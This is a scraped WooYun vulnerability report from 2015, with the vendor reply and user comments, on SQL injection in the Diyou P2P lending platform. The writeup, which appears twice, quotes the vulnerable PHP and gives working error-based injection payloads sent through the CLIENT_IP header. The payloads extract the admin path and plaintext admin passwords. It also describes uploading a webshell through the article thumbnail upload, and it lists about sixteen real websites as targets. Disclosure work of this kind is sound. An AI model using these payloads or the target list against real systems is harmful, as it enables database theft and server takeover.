{"id": 66909, "wybug_id": "wooyun-2015-0132456", "wybug_title": "帝友P2P借货系统全局问题造成多处注入（无视360防御/gpc/受长度限制)", "wybug_corp": "厦门帝网信息科技有限公司", "wybug_author": "Xser", "wybug_date": "2015-08-07 18:57", "wybug_open_date": "2015-11-08 18:14", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-08：\t细节向公众公开  简要描述： 帝友P2P借货系统全局问题(多处注入,无视360防御,gpc)附加整套系统数据库分析从注入一步步到后台拿shell，分析数据库，注入出后台地址和管理员密码明文 详细说明：  ---------------------------注入篇首先看看全局文件出现的问题core\\function.inc.php中\nfunction ip_address() { if(!empty($_SERVER[\"HTTP_CLIENT_IP\"])) { $ip_address = $_SERVER[\"HTTP_CLIENT_IP\"]; }else if(!empty($_SERVER[\"HTTP_X_FORWARDED_FOR\"])){ $ip_address = array_pop(explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])); }else if(!empty($_SERVER[\"REMOTE_ADDR\"])){ $ip_address = $_SERVER[\"REMOTE_ADDR\"]; }else{ $ip_address = ''; } return $ip_address;\n获取IP但是没有做正则和过滤，我们搜索下有哪处调用了\n\n可以看到搜索出243处实际也就10多处，我就不一一举例，就用一处来举例吧（为什么这么说呢，当然我是自己测试过才知道有多少处的，只是为了简洁才不一一）找一处实名认证的来测试文件地址是/core/approve/approve.class.php中\nfunction UpdateRealname($data = array()){\t\tglobal $mysql,$upload;\t\t\t\t//id\t\tif (!IsExiest($data['user_id'])) return \"approve_realname_user_id_empty\";\t\t         //判断真实姓名是否存在        if (!IsExiest($data['realname'])) {            return \"approve_realname_realname_empty\";        }         //判断身份证号是否存在        if (!IsExiest($data['card_id'])) {            return \"approve_realname_card_id_empty\";        }\t\tif (!self::isIdCard($data['card_id'])) {\t\t\treturn \"approve_realname_card_id_error\";\t\t}\t\t\t\t$sql = \"select * from `{approve_realname}` where card_id='{$data['card_id']}' and status=1 and user_id!='{$data['user_id']}'\" ;\t\t$result = $mysql->db_fetch_array($sql);\t\tif ($result!=false) { return \"approve_realname_card_id_exiest\";}\t\t\t\t$result = self::GetRealnameOne(array(\"user_id\"=>$data['user_id']));   \t\tif (IsExiest($data['card_pic1'])!=false){\t\t\t$_data['user_id'] = $result[\"user_id\"];\t\t\t$_data['id'] = $result[\"card_pic1\"];\t\t\t$upload->Delete($_data);\t\t}\t\tif (IsExiest($data['card_pic2'])!=false){\t\t\t$_data['user_id'] = $result[\"user_id\"];\t\t\t$_data['id'] = $result[\"card_pic2\"];\t\t\t$upload->Delete($_data);\t\t}\t\t$sql = \"update `{approve_realname}` set addtime='\".time().\"',addip='\".ip_address().\"',\";\t\tforeach($data as $key => $value){\t\t\t$_sql[] = \"`$key` = '$value'\";\t\t}        $mysql->db_query($sql.join(\",\",$_sql).\" where user_id='{$data['user_id']}'\");\t\treturn $data[\"user_id\"];\n\n$sql = \"update `{approve_realname}` set addtime='\".time().\"',addip='\".ip_address().\"',\";\n这里是调用了ip_address()函数，但有单引号包含，不怕，因为我们不是$GET/$POST/$COOKIE可无视360webscan还有gpc。打开实名认证那块测试注入http://127.0.0.1/?user&q=code/approve/realname\n\n提交，用burp截包。然后添加CLIENT_IP：0'可以看到报错了\n\n试试构造exp，union select是不行的了，可以试试updatexml\nCLIENT_IP:0' or updatexml(1,concat(0x7e,(version())),0) or '\n可以爆出数据了\n\n--------------------------------------------------数据库篇帝友系统是把配置文件都存数据库的，所以后台地址也可以在数据库里找的到。配置文件内容在yyd_system这个表中\n\n找到了，我们试试用注入爆出来看看EXP：\nCLIENT_IP:0' or updatexml(1,concat(0x7e,(select value from yyd_system LIMIT 66,1)),0) or '\n\n\n可以看到爆出了 (~admin)管理员我就不测试爆出了。我们来看看数据库哪里存在了明文存储表:yyd_users_adminlog这个是管理员登陆日志来的，明文记录了密码\n\nEXP：\nCLIENT_IP:0' or updatexml(1,concat(0x7e,(select data from yyd_users_adminlog LIMIT 0,1)),0) or '\n可以看到爆出来\n\n有时太长爆的不完整，可以用substr来截取。-------------------------------------------------好了，最后我们到拿shell篇了打开文章管理，然后添加文章，在萎缩图那里提交图片马，burp截包时修改php后续\n\n\n\n好了可以看到直接上传成功了----------------------------案例篇(送十几个测试案例)\nwww.bliwang.comwww.p2phx.comwww.zhengdaguquan.comwww.lcbang.cnwww.zndai.comwww.cnzyzb.comwww.jinmaoweidai.comwww.mirong.comwww.ronghedai.comwww.woziben.comwww.khcaifu.comwww.leyuancaifu.comwww.daidaicn.comwww.shicaidai.comwww.yingjiudai.comwww.gdqilian.com\n手好累，打了那么长的分析过程   漏洞证明：  ---------------------------注入篇首先看看全局文件出现的问题core\\function.inc.php中\nfunction ip_address() { if(!empty($_SERVER[\"HTTP_CLIENT_IP\"])) { $ip_address = $_SERVER[\"HTTP_CLIENT_IP\"]; }else if(!empty($_SERVER[\"HTTP_X_FORWARDED_FOR\"])){ $ip_address = array_pop(explode(',',$_SERVER['HTTP_X_FORWARDED_FOR'])); }else if(!empty($_SERVER[\"REMOTE_ADDR\"])){ $ip_address = $_SERVER[\"REMOTE_ADDR\"]; }else{ $ip_address = ''; } return $ip_address;\n获取IP但是没有做正则和过滤，我们搜索下有哪处调用了\n\n可以看到搜索出243处实际也就10多处，我就不一一举例，就用一处来举例吧（为什么这么说呢，当然我是自己测试过才知道有多少处的，只是为了简洁才不一一）找一处实名认证的来测试文件地址是/core/approve/approve.class.php中\nfunction UpdateRealname($data = array()){\t\tglobal $mysql,$upload;\t\t\t\t//id\t\tif (!IsExiest($data['user_id'])) return \"approve_realname_user_id_empty\";\t\t         //判断真实姓名是否存在        if (!IsExiest($data['realname'])) {            return \"approve_realname_realname_empty\";        }         //判断身份证号是否存在        if (!IsExiest($data['card_id'])) {            return \"approve_realname_card_id_empty\";        }\t\tif (!self::isIdCard($data['card_id'])) {\t\t\treturn \"approve_realname_card_id_error\";\t\t}\t\t\t\t$sql = \"select * from `{approve_realname}` where card_id='{$data['card_id']}' and status=1 and user_id!='{$data['user_id']}'\" ;\t\t$result = $mysql->db_fetch_array($sql);\t\tif ($result!=false) { return \"approve_realname_card_id_exiest\";}\t\t\t\t$result = self::GetRealnameOne(array(\"user_id\"=>$data['user_id']));   \t\tif (IsExiest($data['card_pic1'])!=false){\t\t\t$_data['user_id'] = $result[\"user_id\"];\t\t\t$_data['id'] = $result[\"card_pic1\"];\t\t\t$upload->Delete($_data);\t\t}\t\tif (IsExiest($data['card_pic2'])!=false){\t\t\t$_data['user_id'] = $result[\"user_id\"];\t\t\t$_data['id'] = $result[\"card_pic2\"];\t\t\t$upload->Delete($_data);\t\t}\t\t$sql = \"update `{approve_realname}` set addtime='\".time().\"',addip='\".ip_address().\"',\";\t\tforeach($data as $key => $value){\t\t\t$_sql[] = \"`$key` = '$value'\";\t\t}        $mysql->db_query($sql.join(\",\",$_sql).\" where user_id='{$data['user_id']}'\");\t\treturn $data[\"user_id\"];\n\n$sql = \"update `{approve_realname}` set addtime='\".time().\"',addip='\".ip_address().\"',\";\n这里是调用了ip_address()函数，但有单引号包含，不怕，因为我们不是$GET/$POST/$COOKIE可无视360webscan还有gpc。打开实名认证那块测试注入http://127.0.0.1/?user&q=code/approve/realname\n\n提交，用burp截包。然后添加CLIENT_IP：0'可以看到报错了\n\n试试构造exp，union select是不行的了，可以试试updatexml\nCLIENT_IP:0' or updatexml(1,concat(0x7e,(version())),0) or '\n可以爆出数据了\n\n--------------------------------------------------数据库篇帝友系统是把配置文件都存数据库的，所以后台地址也可以在数据库里找的到。配置文件内容在yyd_system这个表中\n\n找到了，我们试试用注入爆出来看看EXP：\nCLIENT_IP:0' or updatexml(1,concat(0x7e,(select value from yyd_system LIMIT 66,1)),0) or '\n\n\n可以看到爆出了 (~admin)管理员我就不测试爆出了。我们来看看数据库哪里存在了明文存储表:yyd_users_adminlog这个是管理员登陆日志来的，明文记录了密码\n\nEXP：\nCLIENT_IP:0' or updatexml(1,concat(0x7e,(select data from yyd_users_adminlog LIMIT 0,1)),0) or '\n可以看到爆出来\n\n有时太长爆的不完整，可以用substr来截取。-------------------------------------------------好了，最后我们到拿shell篇了打开文章管理，然后添加文章，在萎缩图那里提交图片马，burp截包时修改php后续\n\n\n\n好了可以看到直接上传成功了----------------------------案例篇(送十几个测试案例)\nwww.bliwang.comwww.p2phx.comwww.zhengdaguquan.comwww.lcbang.cnwww.zndai.comwww.cnzyzb.comwww.jinmaoweidai.comwww.mirong.comwww.ronghedai.comwww.woziben.comwww.khcaifu.comwww.leyuancaifu.comwww.daidaicn.comwww.shicaidai.comwww.yingjiudai.comwww.gdqilian.com\n手好累，打了那么长的分析过程   修复方案：  过滤吧   版权声明：转载请注明来源 Xser@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-08-10 18:13 厂商回复： 非常感谢，经公司研发部门核实，您所提到的漏洞主要出现在我们比较老版本的系统里，正版的帝友系统用户基本都已经打了补丁。再次感谢您对我们帝友系统的关注，以后也欢迎持续为我们提供您宝贵的意见。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-07 19:03 |    \t\tMieless \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:9        | 我是来打酱油的。)\t\t \n  真不让我放心    \n     2015-08-07 19:08 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  牛逼啊    \n     2015-08-07 19:09 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  好快    \n     2015-08-07 19:20 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1077 漏洞数:139        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  又是P2P供应商。。。    \n     2015-08-07 19:23 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  密码明文？    \n     2015-08-07 19:28 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1077 漏洞数:139        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  很好奇影响多少家厂商？    \n     2015-08-07 19:32 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:25        | 开发真是日了狗了)\t\t \n  P2P真是不敢投，资金和个人信息都不安全    \n     2015-08-07 20:08 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:220 漏洞数:80        | The quiter you are,the more you're able ...)\t\t \n  表哥你真棒，晚上去我家吃饭啊,么么    \n     2015-08-08 02:08 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}